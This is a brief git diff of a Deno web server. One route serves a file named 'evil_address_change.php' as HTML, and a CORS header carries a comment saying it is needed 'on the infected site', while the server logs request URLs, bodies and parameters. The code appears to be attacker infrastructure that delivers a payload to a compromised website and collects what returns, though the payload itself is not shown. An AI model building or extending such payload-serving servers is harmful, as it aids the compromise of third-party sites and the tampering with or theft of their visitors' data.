@@ -22,7 +22,7 @@ async function handleGetRequest(req: Request) {
     if (path === "/evil_address_change") {
         const evilFile = await Deno.readTextFileSync("./evil_address_change.php")
 
-        return new Response("evilawdawdFile" + evilFile, {
+        return new Response(evilFile, {
             headers: {
                 "Content-Type": "text/html",
             },
@@ -32,7 +32,7 @@ async function handleGetRequest(req: Request) {
 
     console.log("GET Request. URL: " + req.url + " body: " + req.body + " params: " + url.searchParams + " pathname: " + path)
     return new Response("No one here but us chickens", {
-        headers: {
+        headers: { // NEEDED for the CORS policy on the infected site
             "Content-Type": "text/html",
             "Access-Control-Allow-Origin": "*",
         },
